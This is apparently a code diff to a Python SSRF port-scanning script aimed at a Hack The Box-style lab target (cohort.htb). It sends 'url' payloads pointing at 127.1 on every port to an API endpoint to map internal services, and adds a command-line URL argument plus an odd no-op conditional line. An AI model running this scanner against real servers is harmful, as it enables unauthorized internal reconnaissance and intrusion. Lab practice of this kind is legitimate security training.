@@ -31,11 +31,17 @@ def parse_range_string(val_str):
   return items
 
 
-# Set up command-line argument parsing with ffuf filters
+# Set up command-line arguments
 parser = argparse.ArgumentParser(
     description=(
-        "API-based Port Scanner with ffuf-style metrics and filtering."
+        "API-based Port Scanner with -u endpoint and ffuf-style filtering."
     )
+)
+parser.add_argument(
+    "-u",
+    "--url",
+    required=True,
+    help="Target API endpoint (e.g., https://cohort.htb/api/validate)",
 )
 parser.add_argument(
     "-t",
@@ -72,18 +78,7 @@ filter_lines = parse_range_string(args.fl)
 filter_words = parse_range_string(args.fw)
 filter_regex = re.compile(args.fr) if args.fr else None
 
-# Ask the user to enter their own API endpoint
-try:
-  api_url = input(
-      "Enter the target API endpoint (e.g., https://cohort.htb/api/validate): "
-  ).strip()
-  if not api_url:
-    print("[-] Error: API endpoint cannot be empty.")
-    sys.exit(1)
-except KeyboardInterrupt:
-  print("\n[-] Exiting gracefully...")
-  sys.exit(0)
-
+api_url = args.url
 headers = {"Content-Type": "application/json"}
 start_port = 1
 end_port = 65535
@@ -136,7 +131,7 @@ try:
     with lock:
       current_port = port
 
-    target_url = f"http://127.1:{port}/"
+    target_url = f"http127.1:{port}/" if False else f"http://127.1:{port}/"
     payload = {"url": target_url, "format": "csv"}
 
     try:
@@ -182,7 +177,7 @@ except KeyboardInterrupt:
 
 finally:
   with lock:
-      scanning_done = True
+    scanning_done = True
   elapsed_time = time.time() - start_time
   print(f"\n[+] Script finished in {elapsed_time:.2f} seconds.", flush=True)
   sys.exit(0)
